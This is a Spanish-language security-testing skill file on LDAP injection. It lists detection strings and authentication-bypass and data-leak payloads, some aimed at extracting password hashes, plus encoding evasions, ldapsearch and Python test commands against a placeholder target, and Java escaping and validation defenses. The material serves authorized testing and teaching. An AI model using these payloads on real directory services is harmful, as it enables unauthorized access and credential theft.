---
name: ldap-injection-testing
description: Habilidad profesional y metodología para pruebas de vulnerabilidad de inyección LDAP
version: 1.0.0
---

# Pruebas de vulnerabilidad de inyección LDAP

## Descripción general

La inyección LDAP es una vulnerabilidad similar a la inyección SQL, que aprovecha defectos en la construcción de consultas LDAP y puede provocar fuga de información, evasión de permisos, etc. Esta habilidad proporciona métodos de detección, explotación y protección contra la inyección LDAP.

## Principio de la vulnerabilidad

La aplicación concatena directamente la entrada del usuario en la consulta LDAP sin validación ni filtrado suficientes, lo que permite a un atacante modificar la lógica de la consulta.

**Ejemplo de código peligroso:**
```java
String filter = "(&(cn=" + userInput + ")(userPassword=" + password + "))";
ldapContext.search(baseDN, filter, ...);
```

## Conceptos básicos de LDAP

### Sintaxis de consulta

**Consultas básicas:**
```
(cn=John)
(objectClass=person)
(&(cn=John)(mail=john@example.com))
(|(cn=John)(cn=Jane))
(!(cn=John))
```

### Caracteres especiales

**Caracteres que requieren escape:**
- `(` `)` - Paréntesis
- `*` - Comodín
- `\` - Carácter de escape
- `/` - Separador de ruta
- `NUL` - Carácter nulo

## Métodos de prueba

### 1. Identificar puntos de entrada LDAP

**Funciones comunes:**
- Inicio de sesión de usuario
- Búsqueda de usuarios
- Navegación de directorios
- Verificación de permisos

### 2. Detección básica

**Prueba de caracteres especiales:**
```
*)(&
*)(|
*))(
*))%00
```

**Prueba de operadores lógicos:**
```
*)(&(cn=*
*)(|(cn=*
*))(!(cn=*
```

### 3. Evasión de autenticación

**Evasión básica:**
```
Usuario: *)(&
Contraseña: *
Consulta: (&(cn=*)(&)(userPassword=*))
```

**Evasión más precisa:**
```
Usuario: admin)(&(cn=admin
Contraseña: *))
Consulta: (&(cn=admin)(&(cn=admin)(userPassword=*)))
```

### 4. Fuga de información

**Enumeración de usuarios:**
```
*)(cn=*
*)(uid=*
*)(mail=*
```

**Obtención de atributos:**
```
*)(|(cn=*)(userPassword=*
*)(|(objectClass=*)(cn=*
```

## Técnicas de explotación

### Evasión de autenticación

**Método 1: Evasión lógica**
```
Entrada: *)(&
Consulta: (&(cn=*)(&)(userPassword=*))
Resultado: Coincide con todos los usuarios
```

**Método 2: Evasión con comentarios**
```
Entrada: admin)(&(cn=admin
Consulta: (&(cn=admin)(&(cn=admin)(userPassword=*)))
```

**Método 3: Comodines**
```
Entrada: *)(|(cn=*)(userPassword=*
Consulta: (&(cn=*)(|(cn=*)(userPassword=*)(userPassword=*))
```

### Fuga de información

**Enumerar todos los usuarios:**
```
Búsqueda: *)(cn=*
Resultado: Devuelve todos los atributos cn
```

**Obtener hashes de contraseñas:**
```
Búsqueda: *)(|(cn=*)(userPassword=*
Resultado: Devuelve usuarios y hashes de contraseñas
```

**Obtener atributos sensibles:**
```
Búsqueda: *)(|(cn=*)(mail=*)(telephoneNumber=*
Resultado: Devuelve múltiples atributos sensibles
```

### Escalada de privilegios

**Modificar la lógica de la consulta:**
```
Original: (&(cn=user)(memberOf=CN=Users,DC=example,DC=com))
Inyección: user)(memberOf=CN=Admins,DC=example,DC=com))(|(cn=user
Resultado: Puede evadir la verificación de permisos
```

## Técnicas de evasión

### Evasión de codificación

**Codificación URL:**
```
*)(& → %2A%29%28%26
*)(| → %2A%29%28%7C
```

**Codificación Unicode:**
```
* → \u002A
( → \u0028
) → \u0029
```

### Evasión con comentarios

**Uso de comentarios:**
```
*)(&(cn=*
*)(|(cn=*
```

### Inyección de carácter nulo

**Uso de byte NULL:**
```
*))%00
```

## Uso de herramientas

### JXplorer

**Cliente LDAP gráfico:**
- Conectar al servidor LDAP
- Navegar por la estructura del directorio
- Ejecutar pruebas de consulta

### ldapsearch

```bash
# Consulta básica
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=*)"

# Prueba de inyección
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=*)(&"
```

### Burp Suite

1. Interceptar solicitudes de consulta LDAP
2. Modificar parámetros de consulta
3. Observar los resultados de la respuesta

### Script en Python

```python
import ldap3

server = ldap3.Server('ldap://target.com')
conn = ldap3.Connection(server, authentication=ldap3.SIMPLE,
                        user='cn=admin,dc=example,dc=com',
                        password='password')

# Prueba de inyección
filter_str = '*)(&'
conn.search('dc=example,dc=com', filter_str)
print(conn.entries)
```

## Verificación y reporte

### Pasos de verificación

1. Confirmar que se puede controlar la consulta LDAP
2. Verificar la evasión de autenticación o fuga de información
3. Evaluar el impacto (acceso no autorizado, fuga de datos, etc.)
4. Registrar el PoC completo

### Puntos clave del reporte

- Ubicación de la vulnerabilidad y parámetros de entrada
- Método de construcción de la consulta LDAP
- Pasos completos de explotación y PoC
- Sugerencias de remediación (validación de entrada, consultas parametrizadas, etc.)

## Medidas de protección

### Soluciones recomendadas

1. **Validación de entrada**
   ```java
   private static final String[] LDAP_ESCAPE_CHARS = 
       {"\\", "*", "(", ")", "\0", "/"};
   
   public static String escapeLDAP(String input) {
       if (input == null) {
         return null;
       }
       StringBuilder sb = new StringBuilder();
       for (int i = 0; i < input.length(); i++) {
         char c = input.charAt(i);
         if (Arrays.asList(LDAP_ESCAPE_CHARS).contains(String.valueOf(c))) {
           sb.append("\\");
         }
         sb.append(c);
       }
       return sb.toString();
   }
   ```

2. **Consultas parametrizadas**
   ```java
   // Usar la función de parametrización de la API LDAP
   String filter = "(&(cn={0})(userPassword={1}))";
   Object[] args = {escapedCN, escapedPassword};
   // Usar la API para construir la consulta
   ```

3. **Validación de lista blanca**
   ```java
   // Solo permitir caracteres específicos
   if (!input.matches("^[a-zA-Z0-9@._-]+$")) {
       throw new IllegalArgumentException("Invalid input");
   }
   ```

4. **Mínimo privilegio**
   - Usar una cuenta con privilegios mínimos para la conexión LDAP
   - Restringir los atributos que se pueden consultar
   - Usar listas de control de acceso

5. **Manejo de errores**
   - No devolver información detallada del error
   - Unificar las respuestas de error
   - Registrar logs de errores

## Consideraciones

- Realizar solo en entornos de pruebas de seguridad autorizados
- Prestar atención a las diferencias de sintaxis entre distintos servidores LDAP
- Evitar causar impacto en el directorio durante las pruebas
- Comprender la configuración del servidor LDAP objetivo